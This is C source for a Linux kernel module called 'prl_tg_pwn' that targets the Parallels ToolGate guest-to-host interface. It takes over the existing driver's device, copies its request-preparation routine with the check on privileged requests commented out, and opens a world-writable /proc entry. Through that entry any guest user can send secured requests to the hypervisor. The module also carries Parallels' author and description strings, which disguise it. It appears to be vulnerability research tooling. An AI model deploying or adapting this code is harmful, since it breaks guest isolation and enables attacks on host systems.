#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/pci.h>
#include <linux/vmalloc.h>
#include <linux/interrupt.h>
#include <linux/proc_fs.h>
#include <linux/hash.h>
#include <linux/delay.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include "prltg_common.h"
#include "prltg_compat.h"
#include "prltg_call.h"

static const char *proc_path = "driver/prl_tg_pwn";
static struct proc_dir_entry *proc_entry;
static struct tg_dev *tg_dev;

int prl_tg_user_to_host_request_prepare__pwn(void *ureq, TG_REQ_DESC *sdesc, TG_REQUEST *src)
{
	int ret = 0;
	void *u;

	/* read request header from userspace */
	if (copy_from_user(src, ureq, sizeof(TG_REQUEST)))
		return -EFAULT;

	/*
	 * requests up to TG_REQUEST_SECURED_MAX are for drivers only and are
	 * denied by guest driver if come from user space to maintain guest
	 * kernel integrity (prevent malicious code from sending FS requests)
	 * dynamically assigned requests start from TG_REQUEST_MIN_DYNAMIC
	 */
	printk(KERN_INFO "prl_tg_pwn: preparing request 0x%04x", src->Request);
	// if (src->Request <= TG_REQUEST_SECURED_MAX)
	// 	return -EINVAL;

	memset(sdesc, 0, sizeof(TG_REQ_DESC));
	sdesc->src = src;

	u = ureq + sizeof(TG_REQUEST);
	if (src->InlineByteCount) {
		sdesc->idata = vmalloc(src->InlineByteCount);
		if (sdesc->idata == NULL) {
			ret = -ENOMEM;
			goto err_vm;
		}

		if (copy_from_user(sdesc->idata, u, src->InlineByteCount)) {
			ret = -EFAULT;
			goto err_vm;
		}
	}
	u += INLINE_SIZE(src);
	char buf[256] = {0};
	printk(KERN_INFO "prl_tg_pwn: inline byte count 0x%04x (%d)", src->InlineByteCount, src->InlineByteCount);
	int ibc = 0;
	for (ibc = 0; ibc < (src->InlineByteCount > 127 ? 127 : src->InlineByteCount); ibc++) {
		sprintf(buf + strlen(buf), "%02hhx", ((char *)sdesc->idata)[ibc]);
	}
	printk(KERN_INFO "prl_tg_pwn: inline bytes: %s", buf);

	if (src->BufferCount) {
		/* allocate memory for request's buffers */
		int ssize = src->BufferCount * sizeof(TG_BUFFER);
		sdesc->sbuf = vmalloc(ssize);
		if (!sdesc->sbuf) {
			ret = -ENOMEM;
			goto err_vm;
		}
		/* copy buffer descriptors from userspace */
		if (copy_from_user(sdesc->sbuf, u, ssize)) {
			ret = -EFAULT;
			goto err_vm;
		}
		/* leaving sdesc.kernel_bufs set to 0 to indicate that
		all the buffers are Userspace */
	}

	return 0;

err_vm:
	if (sdesc->sbuf)
		vfree(sdesc->sbuf);
	if (sdesc->idata)
		vfree(sdesc->idata);
	return ret;
}

static ssize_t prl_tg_write(struct file *filp, const char __user *buf,
	size_t nbytes, loff_t *ppos)
{
	printk(KERN_INFO "prl_tg_pwn: write\n");
	int ret = 0, i = 0;
	void *ureq = NULL;
	TG_REQ_DESC sdesc;
	TG_REQUEST src;
	TG_BUFFER *sbuf;

	if (!prl_tg_req_ptr_size_check(nbytes)) {
		printk(KERN_ERR "prl_tg_pwn: failed prl_tg_req_ptr_size_check check\n");
		return -EINVAL;
	}

	if (copy_from_user(&ureq, buf, nbytes)) {
		printk(KERN_ERR "prl_tg_pwn: failed to copy from user\n");
		return -EFAULT;
	}

	// Here we call our own version of this prepare function which doesn't have
	// the security checks in it.
	ret = prl_tg_user_to_host_request_prepare__pwn(ureq, &sdesc, &src);
	if (ret) {
		printk(KERN_ERR "prl_tg_pwn: prepare returned non-zero value: %d\n", ret);
		return ret;
	}

	ret = call_tg_sync(tg_dev, &sdesc);
	return prl_tg_user_to_host_request_complete(ureq, &sdesc, ret);
}

static int prl_tg_open(struct inode *inode, struct file *filp)
{
	(void)inode;
	(void)filp;
	return 0;
}

static int prl_tg_release(struct inode *inode, struct file *filp)
{
	(void)inode;
	(void)filp;
	return 0;
}

static struct proc_ops prl_tg_ops = PRLTG_PROC_OPS_INIT(
		prl_tg_open,
		prl_tg_write,
		NULL, NULL,
		prl_tg_release);

static int __init prl_tg_init_module(void)
{
	printk(KERN_INFO "prl_tg_pwn loaded");
  
	struct inode *inode;
	struct path path;
	int ret;
	ret = kern_path("/proc/driver/prl_tg", LOOKUP_FOLLOW, &path);
	if (ret < 0) {
		printk(KERN_ERR "could not get prl_tg inode. Is prl_tg loaded?\n");
	}
	inode = path.dentry->d_inode;

	tg_dev = prl_pde_data(inode);
	if (!tg_dev) {
		printk(KERN_ERR "could not get tg_dev from inode data\n");
	}

	proc_entry = proc_create(proc_path, S_IWUGO, NULL, &prl_tg_ops);
	if (!proc_entry) {
		printk(KERN_WARNING "could not create %s proc entry\n", proc_path);
	}

	return 0;
}

static void __exit prl_tg_cleanup_module(void)
{
	printk(KERN_INFO "prl_tg_pwn unloaded");
}

module_init(prl_tg_init_module);
module_exit(prl_tg_cleanup_module);

MODULE_AUTHOR("Parallels International GmbH");
MODULE_DESCRIPTION("Parallels ToolGate driver");
MODULE_LICENSE("Parallels");
MODULE_VERSION(DRV_VERSION);
MODULE_INFO(supported, "external");
